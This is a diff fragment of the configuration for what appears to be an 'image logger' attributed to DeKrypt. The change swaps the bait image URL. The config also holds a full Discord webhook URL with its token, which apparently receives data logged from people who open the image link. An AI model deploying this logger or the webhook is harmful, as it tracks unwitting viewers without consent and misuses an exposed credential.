@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1524258570495852594/nyh72_jA9bnxyfHSVFDpt5-tYUWysbvtXnKVX5r9idSisajuUsef1ZO1-EcecWDNP5sp",
-    "image": "https://wallpaperaccess.com/full/3312054.jpg",
+    "image": "https://i.kym-cdn.com/entries/icons/original/000/043/403/cover3.jpg",
     # You can also have a custom image by using a URL argument
     # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
